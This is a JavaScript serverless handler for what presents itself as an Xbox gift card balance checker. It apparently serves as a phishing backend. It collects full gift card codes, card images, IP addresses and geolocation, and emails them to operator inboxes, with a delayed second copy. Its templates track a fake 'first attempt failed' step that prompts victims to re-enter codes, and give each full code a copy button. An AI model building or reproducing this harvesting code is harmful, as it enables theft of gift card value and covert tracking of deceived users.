import { Resend } from 'resend';

function buildEmailAttachments(imageBase64) {
  if (!imageBase64) return [];
  const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
  if (!matches || !matches[2]) return [];

  return [{
    filename: `xbox-card-${Date.now()}.${matches[1]}`,
    content: matches[2],
    encoding: 'base64',
  }];
}

// ============================================================
// Responsive, mobile-first email template
// `showCopy` flag controls whether the copy button appears
// ============================================================
function buildEmailHtml(type, data, showCopy = true) {
  const {
    cardNumber,
    cardNumberFirst,
    cardNumberSecond,
    amount,
    balance,
    timestamp,
    userAgent,
    pageSource,
    message,
    ip,
    location,
  } = data;

  const locationStr = (() => {
    if (!location) return 'Unknown';
    const parts = [location.city, location.region, location.country].filter(
      (p) => p && p !== 'Unknown' && p !== ''
    );
    return parts.length ? parts.join(', ') : 'Unknown';
  })();

  const uid = `c${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`;

  const styles = `
    <style>
      * { margin:0; padding:0; box-sizing:border-box; -webkit-text-size-adjust:100%; -ms-text-size-adjust:100%; }
      body, table, td, p, a { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; }
      img { border:0; outline:none; text-decoration:none; }
      table { border-collapse:collapse !important; }

      .email-bg { background:#eef1f5; padding:16px 8px; }
      .container {
        max-width:600px; width:100%; margin:0 auto;
        background:#ffffff; border-radius:14px; overflow:hidden;
        box-shadow:0 6px 24px rgba(16,24,40,0.08);
      }

      .header { padding:22px 20px; color:#fff; }
      .header h2 { font-size:19px; line-height:1.3; font-weight:700; letter-spacing:-0.3px; }
      .header .sub { font-size:12px; opacity:.9; margin-top:4px; font-weight:500; }

      .body { padding:20px; }

      .field {
        display:block;
        padding:14px 0;
        border-bottom:1px solid #eef1f5;
      }
      .field:last-child { border-bottom:none; }
      .label {
        display:block;
        font-size:11px;
        font-weight:700;
        color:#6b7280;
        text-transform:uppercase;
        letter-spacing:.6px;
        margin-bottom:8px;
      }
      .value {
        display:block;
        font-size:14.5px;
        line-height:1.6;
        color:#111827;
        word-break:break-word;
        overflow-wrap:anywhere;
      }

      .code-wrap {
        display:block;
        background:#0f172a;
        border:1px solid #1e293b;
        border-radius:10px;
        padding:16px 16px;
        margin-top:4px;
        margin-bottom:4px;
      }
      .code-text {
        display:block;
        font-family:'SF Mono','Fira Code','Roboto Mono','Courier New',monospace;
        font-size:16px;
        letter-spacing:2px;
        color:#7dd3fc;
        font-weight:700;
        word-break:break-all;
        overflow-wrap:anywhere;
        line-height:1.7;
        margin-bottom:12px;
        text-align:center;
      }
      .code-text.small { font-size:14px; letter-spacing:1.5px; }
      .code-text.no-btn { margin-bottom:0; }

      .copy-btn {
        display:block;
        width:100%;
        background:#38bdf8;
        color:#0f172a !important;
        font-size:13px;
        font-weight:700;
        text-decoration:none;
        padding:11px 16px;
        border-radius:8px;
        letter-spacing:.4px;
        border:none;
        cursor:pointer;
        text-align:center;
      }
      .copy-btn:active { opacity:.85; }

      .badge {
        display:inline-block;
        padding:4px 12px;
        border-radius:999px;
        font-size:11px;
        font-weight:800;
        letter-spacing:.6px;
        text-transform:uppercase;
      }
      .badge-fail    { background:#fee2e2; color:#991b1b; }
      .badge-success { background:#dcfce7; color:#166534; }
      .badge-warn    { background:#fef3c7; color:#854d0e; }

      .ip-box {
        background:#f8fafc;
        border:1px solid #e2e8f0;
        border-radius:10px;
        padding:14px;
        margin-top:16px;
      }
      .ip-row {
        display:block;
        font-size:13px;
        color:#334155;
        line-height:1.6;
        margin-bottom:8px;
      }
      .ip-row:last-child { margin-bottom:0; }
      .ip-row strong { color:#0f172a; font-weight:700; }
      .ip-val {
        font-family:'SF Mono','Fira Code','Courier New',monospace;
        font-size:12.5px;
        color:#0369a1;
        word-break:break-all;
        overflow-wrap:anywhere;
      }

      .footer {
        text-align:center;
        padding:16px 20px;
        background:#f8fafc;
        color:#94a3b8;
        font-size:11px;
        border-top:1px solid #eef1f5;
        line-height:1.5;
      }

      @media only screen and (max-width:480px) {
        .email-bg { padding:8px 4px; }
        .container { border-radius:10px; }
        .header { padding:18px 16px; }
        .header h2 { font-size:17px; }
        .body { padding:16px; }
        .label { font-size:10.5px; }
        .value { font-size:14px; }
        .code-text { font-size:14px; letter-spacing:1.5px; }
        .code-text.small { font-size:13px; }
        .ip-row { font-size:12.5px; }
        .ip-val { font-size:12px; }
        .field { padding:12px 0; }
      }
    </style>
  `;

  const copyScript = showCopy ? `
    <script>
      (function(){
        var btn = document.getElementById('copy-${uid}');
        if (!btn) return;

        btn.addEventListener('click', function(e){
          e.preventDefault();
          e.stopPropagation();

          var code = btn.getAttribute('data-code') || '';

          var done = function(){
            var t = btn.getAttribute('data-label') || 'Copy Code';
            btn.textContent = '✓ Copied!';
            btn.style.background = '#22c55e';
            btn.style.color = '#ffffff';
            setTimeout(function(){
              btn.textContent = t;
              btn.style.background = '#38bdf8';
              btn.style.color = '#0f172a';
            }, 2000);
          };

          if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(code).then(done).catch(function(){
              fallbackCopy(code, done);
            });
          } else {
            fallbackCopy(code, done);
          }
        });

        function fallbackCopy(text, cb){
          try {
            var ta = document.createElement('textarea');
            ta.value = text;
            ta.setAttribute('readonly', '');
            ta.style.position = 'fixed';
            ta.style.top = '0';
            ta.style.left = '0';
            ta.style.opacity = '0';
            document.body.appendChild(ta);
            ta.focus();
            ta.select();
            ta.setSelectionRange(0, text.length);
            var ok = document.execCommand('copy');
            document.body.removeChild(ta);
            if (ok && cb) cb();
          } catch(err) { /* ignore */ }
        }
      })();
    </script>
  ` : '';

  const codeBlock = (code, small = false) => {
    if (!code) return '<span class="value">N/A</span>';
    const safe = String(code)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');

    if (!showCopy) {
      return `
        <div class="code-wrap">
          <span class="code-text no-btn ${small ? 'small' : ''}">${safe}</span>
        </div>
      `;
    }

    return `
      <div class="code-wrap">
        <span class="code-text ${small ? 'small' : ''}">${safe}</span>
        <button
          id="copy-${uid}"
          class="copy-btn"
          type="button"
          data-code="${safe}"
          data-label="📋 Copy Code"
        >📋 Copy Code</button>
      </div>
    `;
  };

  const ipBox = `
    <div class="ip-box">
      <div class="ip-row"><strong>🌐 IP Address:</strong> <span class="ip-val">${ip || 'N/A'}</span></div>
      <div class="ip-row"><strong>📍 Location:</strong> ${locationStr}</div>
    </div>
  `;

  const wrap = (headerBg, headerTitle, headerSub, bodyContent) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="x-apple-disable-message-reformatting">
  <title>${headerTitle}</title>
  ${styles}
</head>
<body>
  <div class="email-bg">
    <div class="container">
      <div class="header" style="background:${headerBg};">
        <h2>${headerTitle}</h2>
        <div class="sub">${headerSub}</div>
      </div>
      <div class="body">
        ${bodyContent}
        ${ipBox}
      </div>
      <div class="footer">
        Xbox Gift Card Balance Checker<br>Automated Notification
      </div>
    </div>
  </div>
  ${copyScript}
</body>
</html>`;

  if (type === 'first_attempt_failed') {
    return wrap(
      'linear-gradient(135deg,#dc3545,#b02a37)',
      '❌ First Attempt Failed',
      'Xbox Gift Card Verification',
      `
        <div class="field">
          <span class="label">🎮 Gift Card Code</span>
          ${codeBlock(cardNumber)}
        </div>
        <div class="field">
          <span class="label">💰 Amount</span>
          <span class="value">$${amount || '0.00'}</span>
        </div>
        <div class="field">
          <span class="label">📍 Page</span>
          <span class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span>
        </div>
        <div class="field">
          <span class="label">📊 Status</span>
          <span class="value"><span class="badge badge-fail">Failed</span></span>
        </div>
        <div class="field">
          <span class="label">💬 Message</span>
          <span class="value">${message || 'User instructed to re-enter code or upload clearer image'}</span>
        </div>
        <div class="field">
          <span class="label">🕐 Time</span>
          <span class="value">${new Date(timestamp || Date.now()).toLocaleString()}</span>
        </div>
        <div class="field">
          <span class="label">🌐 Browser</span>
          <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
        </div>
      `
    );
  }

  if (type === 'second_attempt_success') {
    return wrap(
      'linear-gradient(135deg,#16a34a,#15803d)',
      '✅ Second Attempt Success',
      'Xbox Gift Card Verification',
      `
        <div class="field">
          <span class="label">🎮 Gift Card Code</span>
          ${codeBlock(cardNumber)}
        </div>
        <div class="field">
          <span class="label">💰 Amount</span>
          <span class="value">$${amount || '0.00'}</span>
        </div>
        <div class="field">
          <span class="label">💵 Balance</span>
          <span class="value" style="font-weight:700;color:#16a34a;font-size:16px;">${balance || 'N/A'}</span>
        </div>
        <div class="field">
          <span class="label">📍 Page</span>
          <span class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span>
        </div>
        <div class="field">
          <span class="label">📊 Status</span>
          <span class="value"><span class="badge badge-success">Success</span></span>
        </div>
        <div class="field">
          <span class="label">💬 Message</span>
          <span class="value">${message || 'Verification successful on second attempt'}</span>
        </div>
        <div class="field">
          <span class="label">🕐 Time</span>
          <span class="value">${new Date(timestamp || Date.now()).toLocaleString()}</span>
        </div>
        <div class="field">
          <span class="label">🌐 Browser</span>
          <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
        </div>
      `
    );
  }

  if (type === 'mismatch_attempt') {
    return wrap(
      'linear-gradient(135deg,#f59e0b,#d97706)',
      '⚠️ Code Mismatch',
      'Xbox Gift Card Verification',
      `
        <div class="field">
          <span class="label">🎮 First Code (Full)</span>
          ${codeBlock(cardNumberFirst)}
        </div>
        <div class="field">
          <span class="label">🎮 Second Code (Full)</span>
          ${codeBlock(cardNumberSecond)}
        </div>
        <div class="field">
          <span class="label">💰 Amount</span>
          <span class="value">$${amount || '0.00'}</span>
        </div>
        <div class="field">
          <span class="label">📍 Page</span>
          <span class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span>
        </div>
        <div class="field">
          <span class="label">📊 Status</span>
          <span class="value"><span class="badge badge-warn">Mismatch</span></span>
        </div>
        <div class="field">
          <span class="label">💬 Message</span>
          <span class="value">${message || 'User entered different code on second attempt'}</span>
        </div>
        <div class="field">
          <span class="label">🕐 Time</span>
          <span class="value">${new Date(timestamp || Date.now()).toLocaleString()}</span>
        </div>
        <div class="field">
          <span class="label">🌐 Browser</span>
          <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
        </div>
      `
    );
  }

  return wrap(
    'linear-gradient(135deg,#107C10,#0b5e0b)',
    'Xbox Gift Card Notification',
    'Automated Notification',
    `
      <div class="field">
        <span class="label">Type</span>
        <span class="value">${type}</span>
      </div>
      <div class="field">
        <span class="label">💰 Amount</span>
        <span class="value">$${amount || '0.00'}</span>
      </div>
      <div class="field">
        <span class="label">💬 Message</span>
        <span class="value">${message || 'No message'}</span>
      </div>
      <div class="field">
        <span class="label">🕐 Time</span>
        <span class="value">${new Date(timestamp || Date.now()).toLocaleString()}</span>
      </div>
    `
  );
}

function buildSubject(type) {
  if (type === 'first_attempt_failed') return 'First Attempt Failed - Xbox Gift Card';
  if (type === 'second_attempt_success') return 'Second Attempt Success - Xbox Gift Card';
  if (type === 'mismatch_attempt') return 'Code Mismatch - Xbox Gift Card';
  return 'Xbox Gift Card Notification';
}

// ============================================================
// Fast IP geolocation — 2s timeout, parallel-ish fallback
// ============================================================
async function getLocationFromIP(ip) {
  if (
    !ip ||
    ip === '127.0.0.1' ||
    ip === '::1' ||
    ip === 'localhost' ||
    ip.startsWith('192.168.') ||
    ip.startsWith('10.') ||
    ip.startsWith('172.16.') ||
    ip.startsWith('172.17.') ||
    ip.startsWith('172.18.') ||
    ip.startsWith('172.19.') ||
    ip.startsWith('172.2') ||
    ip.startsWith('172.30.') ||
    ip.startsWith('172.31.') ||
    ip.startsWith('169.254.') ||
    ip.startsWith('fc') ||
    ip.startsWith('fd') ||
    ip.startsWith('fe80')
  ) {
    return { city: 'Local Network', region: '', country: '' };
  }

  const cleanIP = ip.replace(/^::ffff:/, '');

  const providers = [
    {
      name: 'ipapi.co',
      url: `https://ipapi.co/${cleanIP}/json/`,
      parse: (d) => {
        if (d.error) return null;
        return { city: d.city, region: d.region, country: d.country_name };
      },
    },
    {
      name: 'ipwho.is',
      url: `https://ipwho.is/${cleanIP}`,
      parse: (d) => {
        if (d.success === false) return null;
        return { city: d.city, region: d.region, country: d.country };
      },
    },
    {
      name: 'freeipapi.com',
      url: `https://freeipapi.com/api/json/${cleanIP}`,
      parse: (d) => ({
        city: d.cityName,
        region: d.regionName,
        country: d.countryName,
      }),
    },
  ];

  for (const provider of providers) {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 2000);
      const res = await fetch(provider.url, {
        signal: controller.signal,
        headers: { 'User-Agent': 'xbox-balance-checker/1.0' },
      });
      clearTimeout(timeout);

      if (!res.ok) continue;

      const data = await res.json();
      const parsed = provider.parse(data);
      if (parsed && (parsed.city || parsed.region || parsed.country)) {
        return {
          city: parsed.city || 'Unknown',
          region: parsed.region || '',
          country: parsed.country || '',
        };
      }
    } catch (err) {
      // try next provider
    }
  }

  return { city: 'Unknown', region: '', country: '' };
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Content-Type'
  );

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const formData = req.body || {};
  const {
    type,
    cardNumber,
    cardNumberFirst,
    cardNumberSecond,
    amount,
    balance,
    timestamp,
    userAgent,
    pageSource,
    imageBase64,
    message,
  } = formData;

  // ---- IP extraction ----
  const forwarded = req.headers['x-forwarded-for'];
  let ip = 'Unknown';
  if (typeof forwarded === 'string' && forwarded.length) {
    ip = forwarded.split(',')[0].trim();
  } else if (Array.isArray(forwarded) && forwarded.length) {
    ip = forwarded[0];
  } else {
    ip =
      req.headers['x-real-ip'] ||
      req.headers['cf-connecting-ip'] ||
      req.headers['x-vercel-forwarded-for'] ||
      req.socket?.remoteAddress ||
      req.connection?.remoteAddress ||
      'Unknown';
  }

  const primaryEmail = process.env.PRIMARY_EMAIL;
  const notificationEmail = process.env.NOTIFICATION_EMAIL;
  const resendApiKey = process.env.RESEND_API_KEY;

  // ⭐ Routing flag
  // true  → immediate to PRIMARY_EMAIL (submission time), delayed to NOTIFICATION_EMAIL (fire time)
  // false → immediate to NOTIFICATION_EMAIL only (fire time, since there's no earlier send)
  const sendToPrimary = process.env.SEND_TO_PRIMARY !== 'false';

  if (!resendApiKey) {
    return res.status(500).json({ error: 'Resend email service configuration missing' });
  }

  if (sendToPrimary && !primaryEmail) {
    return res.status(500).json({ error: 'PRIMARY_EMAIL is required when SEND_TO_PRIMARY=true' });
  }

  if (!notificationEmail) {
    return res.status(500).json({ error: 'NOTIFICATION_EMAIL is required' });
  }

  const attachments = buildEmailAttachments(imageBase64);
  const subject = buildSubject(type);

  // ⭐ Capture the exact submission time from the client payload.
  // Fall back to server "now" if the client didn't send one.
  const submissionTimestamp = timestamp || new Date().toISOString();

  const locationPromise = getLocationFromIP(ip).catch(() => ({
    city: 'Unknown',
    region: '',
    country: '',
  }));

  try {
    const resend = new Resend(resendApiKey);

    const quickLocation = await Promise.race([
      locationPromise,
      new Promise((resolve) =>
        setTimeout(() => resolve({ city: 'Unknown', region: '', country: '' }), 1500)
      ),
    ]);

    // Base data shared by both emails — everything except `timestamp`,
    // which we'll override per-email below.
    const baseData = {
      cardNumber,
      cardNumberFirst,
      cardNumberSecond,
      amount,
      balance,
      userAgent,
      pageSource,
      message,
      ip,
      location: quickLocation,
    };

    if (sendToPrimary) {
      // ========================================================
      // MODE: SEND_TO_PRIMARY = true
      // 1) Immediate to PRIMARY_EMAIL → uses SUBMISSION time
      // 2) Delayed to NOTIFICATION_EMAIL → uses FIRE time
      // ========================================================
      console.log('📧 Mode: SEND_TO_PRIMARY=true');

      // --- 1️⃣ Immediate email (submission time) ---
      const immediateData = {
        ...baseData,
        timestamp: submissionTimestamp, // ← exact submission time
      };

      const htmlImmediate = buildEmailHtml(type, immediateData, true);

      const immediateResult = await resend.emails.send({
        from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
        to: primaryEmail,
        subject: subject,
        html: htmlImmediate,
        attachments,
      });

      if (immediateResult.error) {
        throw new Error(immediateResult.error.message || 'Immediate Resend email failed');
      }
      console.log('✅ Immediate email sent to PRIMARY_EMAIL (submission time)');

      // --- 2️⃣ Delayed email (fire time) ---
      setTimeout(async () => {
        try {
          const fullLocation = await locationPromise;

          const delayedData = {
            ...baseData,
            location: fullLocation,
            // ⭐ Use current time at the moment this email actually fires
            timestamp: new Date().toISOString(),
          };

          const htmlScheduled = buildEmailHtml(type, delayedData, false);

          console.log(`⏱️ Firing delayed email to NOTIFICATION_EMAIL (fire time)`);
          const delayedResult = await resend.emails.send({
            from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
            to: notificationEmail,
            subject: subject,
            html: htmlScheduled,
            attachments,
          });

          if (delayedResult.error) {
            console.error('⚠️ Delayed Resend email error:', delayedResult.error);
          } else {
            console.log('✅ Delayed email sent to NOTIFICATION_EMAIL (fire time)');
          }
        } catch (err) {
          console.error('❌ Delayed email exception:', err.message);
        }
      }, 10 * 1000); // 10 seconds

    } else {
      // ========================================================
      // MODE: SEND_TO_PRIMARY = false
      // Send ONLY to NOTIFICATION_EMAIL immediately.
      // Uses submission time (this is the only/first email).
      // ========================================================
      console.log('📧 Mode: SEND_TO_PRIMARY=false (skipping primary)');

      const immediateData = {
        ...baseData,
        timestamp: submissionTimestamp, // ← submission time
      };

      const htmlImmediate = buildEmailHtml(type, immediateData, true);

      const result = await resend.emails.send({
        from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
        to: notificationEmail,
        subject: subject,
        html: htmlImmediate,
        attachments,
      });

      if (result.error) {
        throw new Error(result.error.message || 'Resend email failed');
      }
      console.log('✅ Immediate email sent to NOTIFICATION_EMAIL (submission time, primary skipped)');
    }

  } catch (error) {
    console.error('❌ Resend email failed:', error.message);
    return res.status(502).json({ error: 'Email delivery failed' });
  }

  return res.status(200).json({
    success: true,
    message: 'Submission processed',
    balance: balance || `$${amount || 0}`,
  });
}